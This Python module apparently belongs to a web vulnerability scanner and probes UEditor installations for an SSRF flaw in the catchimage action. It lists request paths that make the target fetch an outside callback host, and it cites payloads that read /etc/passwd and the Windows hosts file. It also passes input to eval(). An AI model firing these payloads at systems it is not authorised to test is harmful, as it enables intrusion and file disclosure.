#!/usr/bin/env python3
# -*- coding:utf-8 -*-

'''
    Ueditor扫描类: 
        ueditor编辑器 SSRF漏洞
            暂无编号
                Payload: https://baizesec.github.io/bylibrary/%E6%BC%8F%E6%B4%9E%E5%BA%93/02-%E7%BC%96%E8%BE%91%E5%99%A8%E6%BC%8F%E6%B4%9E/Ueditor/Ueditor%E7%BC%96%E8%BE%91%E5%99%A81.4.3.3%E7%89%88%E6%9C%ACssrf%E6%BC%8F%E6%B4%9E/
file:///etc/passwd
file:///C:\Windows\System32\drivers\etc\hosts
'''

from lib.initial.config import config
from lib.tool.md5 import md5, random_md5
from lib.tool.thread import thread
from payloads.Ueditor.ssrf import ssrf_scan

class Ueditor():
    def __init__(self):
        self.timeout = config.get('timeout')
        self.headers = config.get('headers')
        self.proxies = config.get('proxies')

        self.app_name = 'Ueditor'
        self.md = md5(self.app_name)
        self.cmd = 'echo ' + self.md

        self.ueditor_ssrf_payloads = [
            {
                'path': 'php/controller.php?action=catchimage&source[]=http://dnsdomain/mouse.jpg',
                'data': ''
            },
            {
                'path': 'jsp/controller.jsp?action=catchimage&source[]=http://dnsdomain/mouse.jpg',
                'data': ''
            },
            {
                'path': 'asp/controller.asp?action=catchimage&source[]=http://dnsdomain/mouse.jpg',
                'data': ''
            },
            {
                'path': 'net/controller.ashx?action=catchimage&source[]=http://dnsdomain/mouse.jpg',
                'data': ''
            },
            # {
            #     'path': 'ueditor/php/controller.php?action=catchimage&source[]=http://dnsdomain/mouse.jpg',
            #     'data': ''
            # },
            # {
            #     'path': 'ueditor/jsp/controller.jsp?action=catchimage&source[]=http://dnsdomain/mouse.jpg',
            #     'data': ''
            # },
            # {
            #     'path': 'ueditor/asp/controller.asp?action=catchimage&source[]=http://dnsdomain/mouse.jpg',
            #     'data': ''
            # },
            # {
            #     'path': 'ueditor/net/controller.ashx?action=catchimage&source[]=http://dnsdomain/mouse.jpg',
            #     'data': ''
            # },
            # {
            #     'path': 'UEditor/php/controller.php?action=catchimage&source[]=http://dnsdomain/mouse.jpg',
            #     'data': ''
            # },
            # {
            #     'path': 'UEditor/jsp/controller.jsp?action=catchimage&source[]=http://dnsdomain/mouse.jpg',
            #     'data': ''
            # },
            # {
            #     'path': 'UEditor/asp/controller.asp?action=catchimage&source[]=http://dnsdomain/mouse.jpg',
            #     'data': ''
            # },
            # {
            #     'path': 'UEditor/net/controller.ashx?action=catchimage&source[]=http://dnsdomain/mouse.jpg',
            #     'data': ''
            # }
        ]

    def addscan(self, url, vuln=None):
        if vuln:
            return eval('thread(target=self.{}_scan, url="{}")'.format(vuln, url))

        return [
            thread(target=self.ueditor_ssrf_scan, url=url)
        ]

Ueditor.ueditor_ssrf_scan = ssrf_scan

ueditor = Ueditor()
